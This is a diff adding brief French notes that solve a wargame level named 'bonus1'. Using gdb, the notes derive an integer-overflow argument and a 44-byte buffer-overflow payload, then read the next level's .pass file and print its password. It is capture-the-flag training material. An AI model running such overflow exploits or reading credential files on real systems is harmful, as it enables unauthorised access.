@@ -1,0 +1,35 @@
+Note: Installer peda si cela n'est pas deja fait.
+
+gdb ./bonus1
+
+info function:
+-----> Le binaire contient uniquement la fonction main.
+
+source /tmp/peda/peda.py
+set disassembly-flavor intel
+
+UINT_MAX / 4 + 1:
+4294967295 / 4 + 1 = 1073741823 + 1 = 1073741824
+
+run -1073741824 test
+
+x/x $esp+8
+0x00000000
+
+-1073741824 - 25 = -1073741799
+
+run -1073741799 hello
+x/x $esp+8
+0x00000064 = 100
+
+offset: 40 
+value: + 4
+
+44 / 4 = 11
+-1073741824 - 11 = -1073741813
+
+./bonus1 -1073741813 `python -c "print 'A' * 40 + '\x46\x4c\x4f\x57'"`
+
+cat /home/user/bonus2/.pass
+
+--> 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
